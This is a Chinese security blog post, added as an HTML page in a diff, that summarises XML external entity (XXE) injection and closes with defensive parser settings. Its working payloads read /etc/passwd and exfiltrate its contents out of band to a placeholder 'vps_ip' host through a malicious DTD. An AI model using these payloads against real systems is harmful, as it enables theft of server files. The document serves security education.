@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="Fazx">
+
+
+
+<meta name="description" content="开篇推荐：  xxelab - 一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo   xxeserver - XXE Out of Band Server.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML外部实体注入(XXE攻击)小结">
+<meta property="og:url" content="0sec.com.cn/2019-02-15/index.html">
+<meta property="og:site_name" content="Cosmic Fragments">
+<meta property="og:description" content="开篇推荐：  xxelab - 一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo   xxeserver - XXE Out of Band Server.">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20190505211650.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20190505211702.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20190505211715.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20190505211726.png">
+<meta property="og:updated_time" content="2019-05-05T13:17:37.327Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XML外部实体注入(XXE攻击)小结">
+<meta name="twitter:description" content="开篇推荐：  xxelab - 一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo   xxeserver - XXE Out of Band Server.">
+<meta name="twitter:image" content="http://0blog.test.upcdn.net/20190505211650.png">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Cosmic Fragments" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>XML外部实体注入(XXE攻击)小结 | Cosmic Fragments</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?16b144395cc20d4a7b4ab64227601921";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Fazx</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">OSCP,OSWP,Security+,@Orange Cyberdefense,请使用HTTP访问本站以加载图片</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa 豆瓣" href="https://www.douban.com/people/faithandchange/" title="豆瓣"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/ping2u" title="知乎"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/Fazx" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">一个喜欢读和写的伪理科生。</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Fazx</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Fazx</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">OSCP,OSWP,Security+,@Orange Cyberdefense,请使用HTTP访问本站以加载图片</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa 豆瓣" target="_blank" href="https://www.douban.com/people/faithandchange/" title="豆瓣"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/ping2u" title="知乎"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Fazx" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-XML外部实体注入-XXE攻击-小结" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019-02-15/" class="article-date">
+      <time datetime="2019-02-15T09:45:36.000Z" itemprop="datePublished">2019-02-15</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XML外部实体注入(XXE攻击)小结
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>开篇推荐：</p>
+<blockquote>
+<p><a href="https://github.com/c0ny1/xxe-lab" target="_blank" rel="noopener">xxelab</a> - 一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo</p>
+</blockquote>
+<blockquote>
+<p><a href="https://github.com/joernchen/xxeserve" target="_blank" rel="noopener">xxeserver</a> - XXE Out of Band Server.</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><blockquote>
+<p>文档类型定义(Document Type Defination)</p>
+</blockquote>
+<p>根据我的理解，DTD就是用于声明<code>实体(ENTITY)</code>的文档，为了结构清晰和防止符号的解析错误，XML中出现了<code>实体引用</code>这个概念，它就类似于一种”文件包含”的形式。</p>
+<p>形如<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>的叫做内部实体，刑如<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>的叫做外部实体，而这个引入URI的过程即<strong>外部实体引入</strong>，也就是xml外部实体注入漏洞的主角了。</p>
+<p>类似的，DTD也分为内部声明和外部引用两种。</p>
+<p>此外，在xml文档的开头<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 中standalone值是yes的时候表示DTD仅用于验证文档结构，从而<strong>外部实体将被禁用</strong>，但它的默认值是no。</p>
+<h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><blockquote>
+<p>可扩展标记语言（eXtensible Markup Language）</p>
+</blockquote>
+<p>HTML主要用于显示数据，倾向数据的外观；XML 主要用于传输和存储数据，倾向数据的内容。</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!-- xml版本与编码 --></span>
+<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+
+<span class="token comment" spellcheck="true">&lt;!-- 文档类型定义(DTD) 可选 --></span>
+&lt;!DOCTYPE note [  <span class="token comment" spellcheck="true">&lt;!--定义此文档是 note 类型的文档--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to,from,heading,body)</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--定义note元素有四个元素--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>   <span class="token comment" spellcheck="true">&lt;!--定义to元素为”#PCDATA”类型--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>   
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">head</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>   
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>   
+]>
+
+<span class="token comment" spellcheck="true">&lt;!-- 文档元素 --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>0sec<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>xxx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!-- 所有XML元素必须有关闭标签 --></span>
+</code></pre>
+<h2 id="XML外部实体注入-Xml-eXternal-Entity-injection"><a href="#XML外部实体注入-Xml-eXternal-Entity-injection" class="headerlink" title="XML外部实体注入(Xml eXternal Entity injection)"></a>XML外部实体注入(Xml eXternal Entity injection)</h2><h3 id="检测是否可解析xml"><a href="#检测是否可解析xml" class="headerlink" title="检测是否可解析xml"></a>检测是否可解析xml</h3><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token doctype">&lt;!DOCTYPE ANY [
+&lt;!ENTITY site "0sec.com.cn"></span>]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity" title="&site;">&amp;site;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>解析成功：</p>
+<p><img src="http://0blog.test.upcdn.net/20190505211650.png" alt></p>
+<p>尝试直接读取任意文件：</p>
+<p><img src="http://0blog.test.upcdn.net/20190505211702.png" alt></p>
+<p>检查服务器是否支持DTD引用外部实体：</p>
+<p><img src="http://0blog.test.upcdn.net/20190505211715.png" alt></p>
+<p>查看<code>access.log</code>可知服务器没有获取到访问<code>index.html</code>的请求，说明DTD外部实体未被调用。</p>
+<p>根据<a href="https://xz.aliyun.com/t/2571" target="_blank" rel="noopener">https://xz.aliyun.com/t/2571</a>，XML外部实体的解析与PHP版本无关，而与编译时的libxml库有关，在我的环境里libXML的版本为2.9.1</p>
+<p><img src="http://0blog.test.upcdn.net/20190505211726.png" alt></p>
+<p>猜测由于查到的资料都比较老旧，新版的环境已经默认不支持DTD外部实体的引用，或做了某些限制。</p>
+<p>测试暂时失败了，不过如上的任意文件读取就是XXE漏洞最简单的利用方式。根据chybeta的文章，读取php、html等文件时由于尖括号<code>&lt;&gt;</code>会导致解析错误，可以用伪协议的方式进行base64转换：</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
+<span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=index.php"></span>]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>引用外部实体的方式还有如下两种：</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE a [
+    &lt;!ENTITY % d SYSTEM "http://0sec.com.cn/evil.dtd"></span>
+    %d;
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c</span><span class="token punctuation">></span></span>
+
+<span class="token comment" spellcheck="true">&lt;!-- evil.dtd: 
+&lt;!ENTITY b SYSTEM "file:///etc/passwd">
+--></span>
+
+或
+
+<span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE a SYSTEM "http://0sec.com.cn/evil.dtd"></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c</span><span class="token punctuation">></span></span>
+
+<span class="token comment" spellcheck="true">&lt;!--
+&lt;!ENTITY b SYSTEM "file:///etc/passwd">
+--></span>
+</code></pre>
+<h3 id="OOB攻击-Blind-XXE"><a href="#OOB攻击-Blind-XXE" class="headerlink" title="OOB攻击(Blind XXE)"></a>OOB攻击(Blind XXE)</h3><p>在看不到回显时，可以使用一种被命名为Blind XXE的攻击方式，也就是所谓的OOB(Out Of Band 数据外带)攻击：</p>
+<p>最简单的形式如下：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE data SYSTEM &quot;http://vps_ip/evil.dtd&quot;&gt;
+&lt;data&gt;&amp;send;&lt;/data&gt;
+
+evil.dtd:
+&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://vps_ip/?%file;&#39;&gt;&quot;&gt;
+%all;
+</code></pre><p>带有参数实体时，形式类似这样：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE data [
+&lt;!ENTITY % remote SYSTEM &quot;http://vps_ip/evil.dtd&quot;&gt;
+%remote;
+%send;
+]&gt;
+&lt;data&gt;4&lt;/data&gt;
+
+evil.dtd:
+&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % param1 &quot;&lt;!ENTITY % send SYSTEM &#39;http://vps_ip/%payload;&#39;&gt;&quot;&gt;
+%param1;
+</code></pre><p>%remote经解析引入了远程主机上的evil.dtd，dtd中引用实体param1引入send定义，在xml中%send解析时即完成了payload传输。</p>
+<p>除了自己在vps上等待接收回显，也可以使用<a href="https://github.com/joernchen/xxeserve" target="_blank" rel="noopener">xxeserver</a>工具完成OOB攻击，但是需要<strong>ruby环境</strong>，可以在kali上配合<strong>frp反向代理</strong>接收传递的数据。</p>
+<h3 id="其他攻击形式"><a href="#其他攻击形式" class="headerlink" title="其他攻击形式"></a>其他攻击形式</h3><ul>
+<li>内网探测/SSRF</li>
+</ul>
+<p>其实就是程序支持<strong>http协议</strong>，可以构造http请求，上面也有例子。</p>
+<ul>
+<li>php下的RCE</li>
+</ul>
+<p>实际是php支持的<strong>expect扩展协议</strong>，需要php装有expect扩展.</p>
+<blockquote>
+<p>并不是传统意义上的任意命令执行，只是因为环境的特殊配置，导致XML与某些命令操作关联，进而造成了命令执行,PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上</p>
+</blockquote>
+<ul>
+<li>DoS</li>
+</ul>
+<p>比较出名的”Billion Laughs 攻击”，payload可见<a href="https://www.freebuf.com/articles/web/97833.html" target="_blank" rel="noopener">DTD/XXE 攻击笔记分享</a>，里面还有一些较少见的攻击方式。</p>
+<h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><p><a href="http://hpdoger.me/2019/01/07/%E4%BB%8E%E4%B8%A4%E9%81%93CTF%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0XXE%E6%BC%8F%E6%B4%9E/#35CTF-Blind-XXE" target="_blank" rel="noopener">35CTF-Blind-XXE</a></p>
+<h2 id="防御漏洞"><a href="#防御漏洞" class="headerlink" title="防御漏洞"></a>防御漏洞</h2><h3 id="开发语言直接禁用外部实体"><a href="#开发语言直接禁用外部实体" class="headerlink" title="开发语言直接禁用外部实体"></a>开发语言直接禁用外部实体</h3><ul>
+<li>PHP：</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<ul>
+<li>JAVA:</li>
+</ul>
+<pre class=" language-java"><code class="language-java">DocumentBuilderFactory dbf <span class="token operator">=</span>DocumentBuilderFactory<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+dbf<span class="token punctuation">.</span><span class="token function">setExpandEntityReferences</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<ul>
+<li>Python：</li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
+xmlData <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>xmlSource<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>…</p>
+<p>参考链接：</p>
+<p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">TSRC</a></p>
+<p><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">chybeta</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019-03-20/">
+                    WordPress 5.1.1 CSRF to RCE 跟进分析
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019-01-26/">
+                    Django开发小记 &amp; Docker笔记
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD"><span class="toc-number">1.1.</span> <span class="toc-text">DTD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML"><span class="toc-number">1.2.</span> <span class="toc-text">XML</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML外部实体注入-Xml-eXternal-Entity-injection"><span class="toc-number">2.</span> <span class="toc-text">XML外部实体注入(Xml eXternal Entity injection)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测是否可解析xml"><span class="toc-number">2.1.</span> <span class="toc-text">检测是否可解析xml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OOB攻击-Blind-XXE"><span class="toc-number">2.2.</span> <span class="toc-text">OOB攻击(Blind XXE)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他攻击形式"><span class="toc-number">2.3.</span> <span class="toc-text">其他攻击形式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF题目"><span class="toc-number">3.</span> <span class="toc-text">CTF题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御漏洞"><span class="toc-number">4.</span> <span class="toc-text">防御漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#开发语言直接禁用外部实体"><span class="toc-number">4.1.</span> <span class="toc-text">开发语言直接禁用外部实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-number">4.2.</span> <span class="toc-text">过滤</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"XML外部实体注入(XXE攻击)小结　| Cosmic Fragments　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019-03-20/" title="上一篇: WordPress 5.1.1 CSRF to RCE 跟进分析">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019-01-26/" title="下一篇: Django开发小记 &amp; Docker笔记">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023-10-28/">窗口期的OSCP(PEN-200-2023)总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2023-07-14/">OSCP NOTE (Cheatsheet)</a></li><li class="post-list-item"><a class="post-list-link" href="/2023-04-30/">50台Vulnhub靶机Walkthrough</a></li><li class="post-list-item"><a class="post-list-link" href="/2023-02-13/">Honeypot-Factory: The Use of Deception in ICS/OT Environments</a></li><li class="post-list-item"><a class="post-list-link" href="/2022-08-21/">Pass the Hash再思考：场景、补丁与监测</a></li><li class="post-list-item"><a class="post-list-link" href="/2022-02-26/">RFID初探之M1卡的分析与复制（使用PN532模块）</a></li><li class="post-list-item"><a class="post-list-link" href="/2022-02-13/">Websocket渗透测试指北</a></li><li class="post-list-item"><a class="post-list-link" href="/2021-12-14/">关于log4j、log4shell的一些记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2021-11-27/">红队视角下的信息收集（备忘 && 持续收集）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020-07-30/">Linux Basic for Hackers</a></li><li class="post-list-item"><a class="post-list-link" href="/2020-02-09/">安全相关HTTP响应头解读、配置、示例与检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-10-31/">Cobaltstrike Server持久化 & Cobaltstrike与Metasploit相互派生shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-08-21/">深入了解子域名挖掘tricks</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-05-14/">Android开发实践之计算器&记事助手</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-04-13/">用Origin请求头防御CSRF攻击(译文)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-04-07/">PHP中的随机数安全问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-03-20/">WordPress 5.1.1 CSRF to RCE 跟进分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-02-15/">XML外部实体注入(XXE攻击)小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-01-26/">Django开发小记 & Docker笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-12-22/">前端安全之CSP、同源策略与跨域请求(JSONP/CORS)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-12-01/">使用Aircrack-ng破解WPA2协议无线网络</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-11-11/">PHP博客管理系统开发全记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-10-10/">环境配置踩坑记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-08-30/">区块链基础[待补充]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-08-05/">校园网免流攻略(基于逻辑漏洞、DNS伪装包或IPv6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-07-11/">基于Scrapy-Redis框架与Mongodb的分布式爬虫-elasticsearch搜索引擎打造</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-26/">《渗透测试实践指南》阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-16/">「Web向」XCTF联赛2018年度考点知识总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-14/">「娱乐向」 Hack for Fun</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-12/">从一道取证题目谈NTFS交换数据流</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-10/">关于Xdebug的那些事儿</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-04-26/">PHP弱类型&&md5碰撞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-04-24/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2024 Fazx
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
